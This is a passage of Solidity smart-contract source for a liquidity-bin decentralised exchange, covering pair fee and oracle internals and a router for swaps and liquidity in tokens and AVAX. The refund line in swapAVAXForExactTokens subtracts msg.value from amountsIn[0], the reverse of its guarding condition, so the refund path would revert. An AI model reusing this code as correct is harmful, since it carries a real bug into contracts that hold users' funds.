_bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;\n    }\n\n    /// @notice Update fees of a given user\n    /// @param _bin The bin where the user has collected fees\n    /// @param _account The address of the user\n    /// @param _id The id where the user has collected fees\n    /// @param _balance The new balance of the user\n    function _updateUserDebts(\n        Bin memory _bin,\n        address _account,\n        uint256 _id,\n        uint256 _balance\n    ) private {\n        uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n        uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);\n\n        _accruedDebts[_account][_id].debtX = _debtX;\n        _accruedDebts[_account][_id].debtY = _debtY;\n    }\n\n    /// @notice Update the unclaimed fees of a given user before a transfer\n    /// @param _bin The bin where the user has collected fees\n    /// @param _user The address of the user\n    /// @param _id The id where the user has collected fees\n    /// @param _previousBalance The previous balance of the user\n    /// @param _newBalance The new balance of the user\n    function _cacheFees(\n        Bin memory _bin,\n        address _user,\n        uint256 _id,\n        uint256 _previousBalance,\n        uint256 _newBalance\n    ) private {\n        unchecked {\n            bytes32 _unclaimedData = _unclaimedFees[_user];\n\n            uint256 amountX = _unclaimedData.decode(type(uint128).max, 0);\n            uint256 amountY = _unclaimedData.decode(type(uint128).max, 128);\n\n            (uint256 _amountX, uint256 _amountY) = _getPendingFees(_bin, _user, _id, _previousBalance);\n            _updateUserDebts(_bin, _user, _id, _newBalance);\n\n            (amountX += _amountX).safe128();\n            (amountY += _amountY).safe128();\n\n            _unclaimedFees[_user] = bytes32((amountY << 128) | amountX);\n        }\n    }\n\n    /// @notice Internal function to set the fee parameters of the pair\n    /// @param _packedFeeParameters The packed fee parameters\n    function _setFeesParameters(bytes32 _packedFeeParameters) internal {\n        bytes32 _feeStorageSlot;\n        assembly {\n            _feeStorageSlot := sload(_feeParameters.slot)\n        }\n\n        uint256 _varParameters = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS);\n        uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);\n\n        assembly {\n            sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))\n        }\n    }\n\n    /// @notice Private function to increase the oracle's number of sample\n    /// @param _newSize The new size of the oracle. Needs to be bigger than current one\n    function _increaseOracle(uint16 _newSize) private {\n        uint256 _oracleSize = _pairInformation.oracleSize;\n\n        if (_oracleSize >= _newSize) revert LBPair__NewSizeTooSmall(_newSize, _oracleSize);\n\n        _pairInformation.oracleSize = _newSize;\n\n        unchecked {\n            for (uint256 _id = _oracleSize; _id < _newSize; ++_id) {\n                _oracle.initialize(_id);\n            }\n        }\n\n        emit OracleSizeIncreased(_oracleSize, _newSize);\n    }\n\n    /// @notice Private view function to return the oracle's parameters\n    /// @return oracleSampleLifetime The lifetime of a sample, it accumulates information for up to this timestamp\n    /// @return oracleSize The size of the oracle (last ids can be empty)\n    /// @return oracleActiveSize The active size of the oracle (no empty data)\n    /// @return oracleLastTimestamp The timestamp of the creation of the oracle's latest sample\n    /// @return oracleId The index of the oracle's latest sample\n    function _getOracleParameters()\n        internal\n        view\n        returns (\n            uint256 oracleSampleLifetime,\n            uint256 oracleSize,\n            uint256 oracleActiveSize,\n            uint256 oracleLastTimestamp,\n            uint256 oracleId\n        )\n    {\n        bytes32 _slot;\n        assembly {\n            _slot := sload(add(_pairInformation.slot, 1))\n        }\n        oracleSampleLifetime = _slot.decode(type(uint16).max, _OFFSET_ORACLE_SAMPLE_LIFETIME);\n        oracleSize = _slot.decode(type(uint16).max, _OFFSET_ORACLE_SIZE);\n        oracleActiveSize = _slot.decode(type(uint16).max, _OFFSET_ORACLE_ACTIVE_SIZE);\n        oracleLastTimestamp = _slot.decode(type(uint40).max, _OFFSET_ORACLE_LAST_TIMESTAMP);\n        oracleId = _slot.decode(type(uint24).max, _OFFSET_ORACLE_ID);\n    }\n\n    /// @notice Internal view function to get the reserves and active id\n    /// @return reserveX The reserve of asset X\n    /// @return reserveY The reserve of asset Y\n    /// @return activeId The active id of the pair\n    function _getReservesAndId()\n        internal\n        view\n        returns (\n            uint256 reserveX,\n            uint256 reserveY,\n            uint256 activeId\n        )\n    {\n        uint256 _mask24 = type(uint24).max;\n        uint256 _mask136 = type(uint136).max;\n        assembly {\n            let slot := sload(add(_pairInformation.slot, 1))\n            reserveY := and(slot, _mask136)\n\n            slot := sload(_pairInformation.slot)\n            activeId := and(slot, _mask24)\n            reserveX := and(shr(_OFFSET_PAIR_RESERVE_X, slot), _mask136)\n        }\n    }\n\n    /// @notice Internal view function to get the bin at `id`\n    /// @param _id The bin id\n    /// @return reserveX The reserve of tokenX of the bin\n    /// @return reserveY The reserve of tokenY of the bin\n    function _getBin(uint24 _id) internal view returns (uint256 reserveX, uint256 reserveY) {\n        bytes32 _data;\n        uint256 _mask112 = type(uint112).max;\n        // low level read of mapping to only load 1 storage slot\n        assembly {\n            mstore(0, _id)\n            mstore(32, _bins.slot)\n            _data := sload(keccak256(0, 64))\n\n            reserveX := and(_data, _mask112)\n            reserveY := shr(_OFFSET_BIN_RESERVE_Y, _data)\n        }\n\n        return (reserveX.safe112(), reserveY.safe112());\n    }\n\n    /// @notice Internal view function to get the global fees information, the total fees and those for protocol\n    /// @dev The fees for users are `total - protocol`\n    /// @return feesXTotal The total fees of asset X\n    /// @return feesYTotal The total fees of asset Y\n    /// @return feesXProtocol The protocol fees of asset X\n    /// @return feesYProtocol The protocol fees of asset Y\n    function _getGlobalFees()\n        internal\n        view\n        returns (\n            uint256 feesXTotal,\n            uint256 feesYTotal,\n            uint256 feesXProtocol,\n            uint256 feesYProtocol\n        )\n    {\n        bytes32 _slotX;\n        bytes32 _slotY;\n        assembly {\n            _slotX := sload(add(_pairInformation.slot, 2))\n            _slotY := sload(add(_pairInformation.slot, 3))\n        }\n\n        feesXTotal = _slotX.decode(type(uint128).max, 0);\n        feesYTotal = _slotY.decode(type(uint128).max, 0);\n\n        feesXProtocol = _slotX.decode(type(uint128).max, _OFFSET_PROTOCOL_FEE);\n        feesYProtocol = _slotY.decode(type(uint128).max, _OFFSET_PROTOCOL_FEE);\n    }\n\n    /// @notice Internal pure function to return the flashloan fee amount\n    /// @param _amount The amount to flashloan\n    /// @param _fee the fee percentage, in basis point\n    /// @return The fee amount\n    function _getFlashLoanFee(uint256 _amount, uint256 _fee) internal pure returns (uint256) {\n        return (_amount * _fee) / Constants.PRECISION;\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"openzeppelin/token/ERC20/IERC20.sol\";\n\nimport \"./LBErrors.sol\";\nimport \"./libraries/BinHelper.sol\";\nimport \"./libraries/Constants.sol\";\nimport \"./libraries/FeeHelper.sol\";\nimport \"./libraries/Math512Bits.sol\";\nimport \"./libraries/SwapHelper.sol\";\nimport \"./libraries/TokenHelper.sol\";\nimport \"./interfaces/IJoePair.sol\";\nimport \"./interfaces/ILBToken.sol\";\nimport \"./interfaces/ILBRouter.sol\";\n\n/// @title Liquidity Book Router\n/// @author Trader Joe\n/// @notice Main contract to interact with to swap and manage liquidity on Joe V2 exchange.\ncontract LBRouter is ILBRouter {\n    using TokenHelper for IERC20;\n    using TokenHelper for IWAVAX;\n    using FeeHelper for FeeHelper.FeeParameters;\n    using Math512Bits for uint256;\n    using SwapHelper for ILBPair.Bin;\n\n    ILBFactory public immutable override factory;\n    IJoeFactory public immutable override oldFactory;\n    IWAVAX public immutable override wavax;\n\n    modifier onlyFactoryOwner() {\n        if (msg.sender != factory.owner()) revert LBRouter__NotFactoryOwner();\n        _;\n    }\n\n    modifier ensure(uint256 _deadline) {\n        if (block.timestamp > _deadline) revert LBRouter__DeadlineExceeded(_deadline, block.timestamp);\n        _;\n    }\n\n    modifier verifyInputs(uint256[] memory _pairBinSteps, IERC20[] memory _tokenPath) {\n        if (_pairBinSteps.length == 0 || _pairBinSteps.length + 1 != _tokenPath.length)\n            revert LBRouter__LengthsMismatch();\n        _;\n    }\n\n    /// @notice Constructor\n    /// @param _factory LBFactory address\n    /// @param _oldFactory Address of old factory (Joe V1)\n    /// @param _wavax Address of WAVAX\n    constructor(\n        ILBFactory _factory,\n        IJoeFactory _oldFactory,\n        IWAVAX _wavax\n    ) {\n        factory = _factory;\n        oldFactory = _oldFactory;\n        wavax = _wavax;\n    }\n\n    /// @dev Receive function that only accept AVAX from the WAVAX contract\n    receive() external payable {\n        if (msg.sender != address(wavax)) revert LBRouter__SenderIsNotWAVAX();\n    }\n\n    /// @notice Returns the approximate id corresponding to the inputted price.\n    /// Warning, the returned id may be inaccurate close to the start price of a bin\n    /// @param _LBPair The address of the LBPair\n    /// @param _price The price of y per x (multiplied by 1e36)\n    /// @return The id corresponding to this price\n    function getIdFromPrice(ILBPair _LBPair, uint256 _price) external view override returns (uint24) {\n        return BinHelper.getIdFromPrice(_price, _LBPair.feeParameters().binStep);\n    }\n\n    /// @notice Returns the price corresponding to the inputted id\n    /// @param _LBPair The address of the LBPair\n    /// @param _id The id\n    /// @return The price corresponding to this id\n    function getPriceFromId(ILBPair _LBPair, uint24 _id) external view override returns (uint256) {\n        return BinHelper.getPriceFromId(_id, _LBPair.feeParameters().binStep);\n    }\n\n    /// @notice Simulate a swap in\n    /// @param _LBPair The address of the LBPair\n    /// @param _amountOut The amount of token to receive\n    /// @param _swapForY Whether you swap X for Y (true), or Y for X (false)\n    /// @return amountIn The amount of token to send in order to receive _amountOut token\n    /// @return feesIn The amount of fees paid in token sent\n    function getSwapIn(\n        ILBPair _LBPair,\n        uint256 _amountOut,\n        bool _swapForY\n    ) public view override returns (uint256 amountIn, uint256 feesIn) {\n        (uint256 _pairReserveX, uint256 _pairReserveY, uint256 _activeId) = _LBPair.getReservesAndId();\n\n        if (_amountOut == 0 || (_swapForY ? _amountOut > _pairReserveY : _amountOut > _pairReserveX))\n            revert LBRouter__WrongAmounts(_amountOut, _swapForY ? _pairReserveY : _pairReserveX); // If this is wrong, then we're sure the amounts sent are wrong\n\n        FeeHelper.FeeParameters memory _fp = _LBPair.feeParameters();\n        _fp.updateVariableFeeParameters(_activeId);\n\n        uint256 _amountOutOfBin;\n        uint256 _amountInWithFees;\n        uint256 _reserve;\n        // Performs the actual swap, bin per bin\n        // It uses the findFirstNonEmptyBinId function to make sure the bin we're currently looking at\n        // has liquidity in it.\n        while (true) {\n            {\n                (uint256 _reserveX, uint256 _reserveY) = _LBPair.getBin(uint24(_activeId));\n                _reserve = _swapForY ? _reserveY : _reserveX;\n            }\n            uint256 _price = BinHelper.getPriceFromId(_activeId, _fp.binStep);\n            if (_reserve != 0) {\n                _amountOutOfBin = _amountOut > _reserve ? _reserve : _amountOut;\n\n                uint256 _amountInToBin = _swapForY\n                    ? _amountOutOfBin.shiftDivRoundUp(Constants.SCALE_OFFSET, _price)\n                    : _price.mulShiftRoundUp(_amountOutOfBin, Constants.SCALE_OFFSET);\n\n                // We update the fee, but we don't store the new volatility reference, volatility accumulated and indexRef to not penalize traders\n                _fp.updateVolatilityAccumulated(_activeId);\n                uint256 _fee = _fp.getFeeAmount(_amountInToBin);\n                _amountInWithFees = _amountInToBin + _fee;\n\n                if (_amountInWithFees + _reserve > type(uint112).max) revert LBRouter__SwapOverflows(_activeId);\n                amountIn += _amountInWithFees;\n                feesIn += _fee;\n                _amountOut -= _amountOutOfBin;\n            }\n\n            if (_amountOut != 0) {\n                _activeId = _LBPair.findFirstNonEmptyBinId(uint24(_activeId), _swapForY);\n            } else {\n                break;\n            }\n        }\n        if (_amountOut != 0) revert LBRouter__BrokenSwapSafetyCheck(); // Safety check, but should never be false as it would have reverted on transfer\n    }\n\n    /// @notice Simulate a swap out\n    /// @param _LBPair The address of the LBPair\n    /// @param _amountIn The amount of token sent\n    /// @param _swapForY Whether you swap X for Y (true), or Y for X (false)\n    /// @return amountOut The amount of token received if _amountIn tokenX are sent\n    /// @return feesIn The amount of fees paid in token sent\n    function getSwapOut(\n        ILBPair _LBPair,\n        uint256 _amountIn,\n        bool _swapForY\n    ) external view override returns (uint256 amountOut, uint256 feesIn) {\n        (, , uint256 _activeId) = _LBPair.getReservesAndId();\n\n        FeeHelper.FeeParameters memory _fp = _LBPair.feeParameters();\n        _fp.updateVariableFeeParameters(_activeId);\n        ILBPair.Bin memory _bin;\n\n        // Performs the actual swap, bin per bin\n        // It uses the findFirstNonEmptyBinId function to make sure the bin we're currently looking at\n        // has liquidity in it.\n        while (true) {\n            {\n                (uint256 _reserveX, uint256 _reserveY) = _LBPair.getBin(uint24(_activeId));\n                _bin = ILBPair.Bin(uint112(_reserveX), uint112(_reserveY), 0, 0);\n            }\n            if (_bin.reserveX != 0 || _bin.reserveY != 0) {\n                (uint256 _amountInToBin, uint256 _amountOutOfBin, FeeHelper.FeesDistribution memory _fees) = _bin\n                    .getAmounts(_fp, _activeId, _swapForY, _amountIn);\n\n                if (_amountInToBin > type(uint112).max) revert LBRouter__BinReserveOverflows(_activeId);\n\n                _amountIn -= _amountInToBin + _fees.total;\n                feesIn += _fees.total;\n                amountOut += _amountOutOfBin;\n            }\n\n            if (_amountIn != 0) {\n                _activeId = _LBPair.findFirstNonEmptyBinId(uint24(_activeId), _swapForY);\n            } else {\n                break;\n            }\n        }\n        if (_amountIn != 0) revert LBRouter__TooMuchTokensIn(_amountIn);\n    }\n\n    /// @notice Create a liquidity bin LBPair for _tokenX and _tokenY using the factory\n    /// @param _tokenX The address of the first token\n    /// @param _tokenY The address of the second token\n    /// @param _activeId The active id of the pair\n    /// @param _binStep The bin step in basis point, used to calculate log(1 + binStep)\n    /// @return pair The address of the newly created LBPair\n    function createLBPair(\n        IERC20 _tokenX,\n        IERC20 _tokenY,\n        uint24 _activeId,\n        uint16 _binStep\n    ) external override returns (ILBPair pair) {\n        pair = factory.createLBPair(_tokenX, _tokenY, _activeId, _binStep);\n    }\n\n    /// @notice Add liquidity while performing safety checks\n    /// @dev This function is compliant with fee on transfer tokens\n    /// @param _liquidityParameters The liquidity parameters\n    /// @return depositIds Bin ids where the liquidity was actually deposited\n    /// @return liquidityMinted Amounts of LBToken minted for each bin\n    function addLiquidity(LiquidityParameters memory _liquidityParameters)\n        external\n        override\n        returns (uint256[] memory depositIds, uint256[] memory liquidityMinted)\n    {\n        ILBPair _LBPair = _getLBPairInformation(\n            _liquidityParameters.tokenX,\n            _liquidityParameters.tokenY,\n            _liquidityParameters.binStep\n        );\n        if (_liquidityParameters.tokenX != _LBPair.tokenX()) revert LBRouter__WrongTokenOrder();\n\n        _liquidityParameters.tokenX.safeTransferFrom(msg.sender, address(_LBPair), _liquidityParameters.amountX);\n        _liquidityParameters.tokenY.safeTransferFrom(msg.sender, address(_LBPair), _liquidityParameters.amountY);\n\n        (depositIds, liquidityMinted) = _addLiquidity(_liquidityParameters, _LBPair);\n    }\n\n    /// @notice Add liquidity with AVAX while performing safety checks\n    /// @dev This function is compliant with fee on transfer tokens\n    /// @param _liquidityParameters The liquidity parameters\n    /// @return depositIds Bin ids where the liquidity was actually deposited\n    /// @return liquidityMinted Amounts of LBToken minted for each bin\n    function addLiquidityAVAX(LiquidityParameters memory _liquidityParameters)\n        external\n        payable\n        override\n        returns (uint256[] memory depositIds, uint256[] memory liquidityMinted)\n    {\n        ILBPair _LBPair = _getLBPairInformation(\n            _liquidityParameters.tokenX,\n            _liquidityParameters.tokenY,\n            _liquidityParameters.binStep\n        );\n        if (_liquidityParameters.tokenX != _LBPair.tokenX()) revert LBRouter__WrongTokenOrder();\n\n        if (_liquidityParameters.tokenX == wavax && _liquidityParameters.amountX == msg.value) {\n            _wavaxDepositAndTransfer(address(_LBPair), msg.value);\n            _liquidityParameters.tokenY.safeTransferFrom(msg.sender, address(_LBPair), _liquidityParameters.amountY);\n        } else if (_liquidityParameters.tokenY == wavax && _liquidityParameters.amountY == msg.value) {\n            _liquidityParameters.tokenX.safeTransferFrom(msg.sender, address(_LBPair), _liquidityParameters.amountX);\n            _wavaxDepositAndTransfer(address(_LBPair), msg.value);\n        } else\n            revert LBRouter__WrongAvaxLiquidityParameters(\n                address(_liquidityParameters.tokenX),\n                address(_liquidityParameters.tokenY),\n                _liquidityParameters.amountX,\n                _liquidityParameters.amountY,\n                msg.value\n            );\n\n        (depositIds, liquidityMinted) = _addLiquidity(_liquidityParameters, _LBPair);\n    }\n\n    /// @notice Remove liquidity while performing safety checks\n    /// @dev This function is compliant with fee on transfer tokens\n    /// @param _tokenX The address of token X\n    /// @param _tokenY The address of token Y\n    /// @param _binStep The bin step of the LBPair\n    /// @param _amountXMin The min amount to receive of token X\n    /// @param _amountYMin The min amount to receive of token Y\n    /// @param _ids The list of ids to burn\n    /// @param _amounts The list of amounts to burn of each id in `_ids`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountX Amount of token X returned\n    /// @return amountY Amount of token Y returned\n    function removeLiquidity(\n        IERC20 _tokenX,\n        IERC20 _tokenY,\n        uint16 _binStep,\n        uint256 _amountXMin,\n        uint256 _amountYMin,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        address _to,\n        uint256 _deadline\n    ) external override ensure(_deadline) returns (uint256 amountX, uint256 amountY) {\n        ILBPair _LBPair = _getLBPairInformation(_tokenX, _tokenY, _binStep);\n        if (_tokenX != _LBPair.tokenX()) {\n            (_tokenX, _tokenY) = (_tokenY, _tokenX);\n            (_amountXMin, _amountYMin) = (_amountYMin, _amountXMin);\n        }\n\n        (amountX, amountY) = _removeLiquidity(_LBPair, _amountXMin, _amountYMin, _ids, _amounts, _to);\n    }\n\n    /// @notice Remove AVAX liquidity while performing safety checks\n    /// @dev This function is **NOT** compliant with fee on transfer tokens.\n    /// This is wanted as it would make users pays the fee on transfer twice,\n    /// use the `removeLiquidity` function to remove liquidity with fee on transfer tokens.\n    /// @param _token The address of token\n    /// @param _binStep The bin step of the LBPair\n    /// @param _amountTokenMin The min amount to receive of token\n    /// @param _amountAVAXMin The min amount to receive of AVAX\n    /// @param _ids The list of ids to burn\n    /// @param _amounts The list of amounts to burn of each id in `_ids`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountToken Amount of token returned\n    /// @return amountAVAX Amount of AVAX returned\n    function removeLiquidityAVAX(\n        IERC20 _token,\n        uint16 _binStep,\n        uint256 _amountTokenMin,\n        uint256 _amountAVAXMin,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        address payable _to,\n        uint256 _deadline\n    ) external override ensure(_deadline) returns (uint256 amountToken, uint256 amountAVAX) {\n        ILBPair _LBPair = _getLBPairInformation(_token, IERC20(wavax), _binStep);\n\n        bool _isAVAXTokenY = IERC20(wavax) == _LBPair.tokenY();\n        {\n            if (!_isAVAXTokenY) {\n                (_amountTokenMin, _amountAVAXMin) = (_amountAVAXMin, _amountTokenMin);\n            }\n\n            (uint256 _amountX, uint256 _amountY) = _removeLiquidity(\n                _LBPair,\n                _amountTokenMin,\n                _amountAVAXMin,\n                _ids,\n                _amounts,\n                address(this)\n            );\n\n            (amountToken, amountAVAX) = _isAVAXTokenY ? (_amountX, _amountY) : (_amountY, _amountX);\n        }\n\n        _token.safeTransfer(_to, amountToken);\n\n        wavax.withdraw(amountAVAX);\n        _safeTransferAVAX(_to, amountAVAX);\n    }\n\n    /// @notice Swaps exact tokens for tokens while performing safety checks\n    /// @param _amountIn The amount of token to send\n    /// @param _amountOutMin The min amount of token to receive\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountOut Output amount of the swap\n    function swapExactTokensForTokens(\n        uint256 _amountIn,\n        uint256 _amountOutMin,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address _to,\n        uint256 _deadline\n    ) external override ensure(_deadline) verifyInputs(_pairBinSteps, _tokenPath) returns (uint256 amountOut) {\n        address[] memory _pairs = _getPairs(_pairBinSteps, _tokenPath);\n\n        _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], _amountIn);\n\n        amountOut = _swapExactTokensForTokens(_amountIn, _pairs, _pairBinSteps, _tokenPath, _to);\n\n        if (_amountOutMin > amountOut) revert LBRouter__InsufficientAmountOut(_amountOutMin, amountOut);\n    }\n\n    /// @notice Swaps exact tokens for AVAX while performing safety checks\n    /// @param _amountIn The amount of token to send\n    /// @param _amountOutMinAVAX The min amount of AVAX to receive\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountOut Output amount of the swap\n    function swapExactTokensForAVAX(\n        uint256 _amountIn,\n        uint256 _amountOutMinAVAX,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address payable _to,\n        uint256 _deadline\n    ) external override ensure(_deadline) verifyInputs(_pairBinSteps, _tokenPath) returns (uint256 amountOut) {\n        if (_tokenPath[_pairBinSteps.length] != IERC20(wavax))\n            revert LBRouter__InvalidTokenPath(address(_tokenPath[_pairBinSteps.length]));\n\n        address[] memory _pairs = _getPairs(_pairBinSteps, _tokenPath);\n\n        _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], _amountIn);\n\n        amountOut = _swapExactTokensForTokens(_amountIn, _pairs, _pairBinSteps, _tokenPath, address(this));\n\n        if (_amountOutMinAVAX > amountOut) revert LBRouter__InsufficientAmountOut(_amountOutMinAVAX, amountOut);\n\n        wavax.withdraw(amountOut);\n        _safeTransferAVAX(_to, amountOut);\n    }\n\n    /// @notice Swaps exact AVAX for tokens while performing safety checks\n    /// @param _amountOutMin The min amount of token to receive\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountOut Output amount of the swap\n    function swapExactAVAXForTokens(\n        uint256 _amountOutMin,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address _to,\n        uint256 _deadline\n    ) external payable override ensure(_deadline) verifyInputs(_pairBinSteps, _tokenPath) returns (uint256 amountOut) {\n        address[] memory _pairs = _getPairs(_pairBinSteps, _tokenPath);\n\n        _wavaxDepositAndTransfer(_pairs[0], msg.value);\n\n        amountOut = _swapExactTokensForTokens(msg.value, _pairs, _pairBinSteps, _tokenPath, _to);\n\n        if (_amountOutMin > amountOut) revert LBRouter__InsufficientAmountOut(_amountOutMin, amountOut);\n    }\n\n    /// @notice Swaps tokens for exact tokens while performing safety checks\n    /// @param _amountOut The amount of token to receive\n    /// @param _amountInMax The max amount of token to send\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountsIn Input amounts for every step of the swap\n    function swapTokensForExactTokens(\n        uint256 _amountOut,\n        uint256 _amountInMax,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address _to,\n        uint256 _deadline\n    ) external override ensure(_deadline) verifyInputs(_pairBinSteps, _tokenPath) returns (uint256[] memory amountsIn) {\n        address[] memory _pairs = _getPairs(_pairBinSteps, _tokenPath);\n        amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountOut);\n\n        if (amountsIn[0] > _amountInMax) revert LBRouter__MaxAmountInExceeded(_amountInMax, amountsIn[0]);\n\n        _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], amountsIn[0]);\n\n        uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, _to);\n\n        if (_amountOutReal < _amountOut) revert LBRouter__InsufficientAmountOut(_amountOut, _amountOutReal);\n    }\n\n    /// @notice Swaps tokens for exact AVAX while performing safety checks\n    /// @param _amountAVAXOut The amount of AVAX to receive\n    /// @param _amountInMax The max amount of token to send\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountsIn Input amounts for every step of the swap\n    function swapTokensForExactAVAX(\n        uint256 _amountAVAXOut,\n        uint256 _amountInMax,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address payable _to,\n        uint256 _deadline\n    ) external override ensure(_deadline) verifyInputs(_pairBinSteps, _tokenPath) returns (uint256[] memory amountsIn) {\n        if (_tokenPath[_pairBinSteps.length] != IERC20(wavax))\n            revert LBRouter__InvalidTokenPath(address(_tokenPath[_pairBinSteps.length]));\n\n        address[] memory _pairs = _getPairs(_pairBinSteps, _tokenPath);\n        amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountAVAXOut);\n\n        if (amountsIn[0] > _amountInMax) revert LBRouter__MaxAmountInExceeded(_amountInMax, amountsIn[0]);\n\n        _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], amountsIn[0]);\n\n        uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, address(this));\n\n        if (_amountOutReal < _amountAVAXOut) revert LBRouter__InsufficientAmountOut(_amountAVAXOut, _amountOutReal);\n\n        wavax.withdraw(_amountOutReal);\n        _safeTransferAVAX(_to, _amountOutReal);\n    }\n\n    /// @notice Swaps AVAX for exact tokens while performing safety checks\n    /// @dev will refund any excess sent\n    /// @param _amountOut The amount of tokens to receive\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountsIn Input amounts for every step of the swap\n    function swapAVAXForExactTokens(\n        uint256 _amountOut,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address _to,\n        uint256 _deadline\n    )\n        external\n        payable\n        override\n        ensure(_deadline)\n        verifyInputs(_pairBinSteps, _tokenPath)\n        returns (uint256[] memory amountsIn)\n    {\n        if (_tokenPath[0] != IERC20(wavax)) revert LBRouter__InvalidTokenPath(address(_tokenPath[0]));\n\n        address[] memory _pairs = _getPairs(_pairBinSteps, _tokenPath);\n        amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountOut);\n\n        if (amountsIn[0] > msg.value) revert LBRouter__MaxAmountInExceeded(msg.value, amountsIn[0]);\n\n        _wavaxDepositAndTransfer(_pairs[0], amountsIn[0]);\n\n        uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, _to);\n\n        if (_amountOutReal < _amountOut) revert LBRouter__InsufficientAmountOut(_amountOut, _amountOutReal);\n\n        if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value);\n    }\n\n    /// @notice Swaps exact tokens for tokens while performing safety checks supporting for fee on transfer tokens\n    /// @param _amountIn The amount of token to send\n    /// @param _amountOutMin The min amount of token to receive\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountOut Output amount of the swap\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 _amountIn,\n        uint256 _amountOutMin,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address _to,\n        uint256 _deadline\n    ) external override ensure(_deadline) verifyInputs(_pairBinSteps, _tokenPath) returns (uint256 amountOut) {\n        address[] memory _pairs = _getPairs(_pairBinSteps, _tokenPath);\n\n        IERC20 _targetToken = _tokenPath[_pairs.length];\n\n        uint256 _balanceBefore = _targetToken.balanceOf(_to);\n\n        _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], _amountIn);\n\n        _swapSupportingFeeOnTransferTokens(_pairs, _pairBinSteps, _tokenPath, _to);\n\n        amountOut = _targetToken.balanceOf(_to) - _balanceBefore;\n        if (_amountOutMin > amountOut) revert LBRouter__InsufficientAmountOut(_amountOutMin, amountOut);\n    }\n\n    /// @notice Swaps exact tokens for AVAX while performing safety checks supporting for fee on transfer tokens\n    /// @param _amountIn The amount of token to send\n    /// @param _amountOutMinAVAX The min amount of AVAX to receive\n    /// @param _pairBinSteps The bin step of the pairs (0: V1, other values will use V2)\n    /// @param _tokenPath The swap path using the binSteps following `_pairBinSteps`\n    /// @param _to The address of the recipient\n    /// @param _deadline The deadline of the tx\n    /// @return amountOut Output amount of the swap\n    function swapExactTokensForAVAXSupportingFeeOnTransferTokens(\n        uint256 _amountIn,\n        uint256 _amountOutMinAVAX,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address payable _to,\n        uint256 _deadline\n    ) external override ensure(_deadline) verifyInputs(_pairBinSteps, _tokenPath) returns (uint256 amountOut) {\n        if (_tokenPath[_pairBinSteps.length] != IERC20(wavax))\n            revert LBRouter__InvalidTokenPath(address(_tokenPath[_pairBinSteps.length]));\n\n        address[] memory _pairs = _getPairs(_pairBinSteps, _tokenPath);\n\n        uint256 _balanceBefore = wavax.balanceOf(address(this));\n\n        _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], _amountIn);\n\n        _swapSupportingFeeOnTransferTokens(_pairs, _pairBinSteps, _tokenPath, address(this));\n\n        amountOut = wavax.balanceOf(address(this)) - _balanceBefore;\n        if 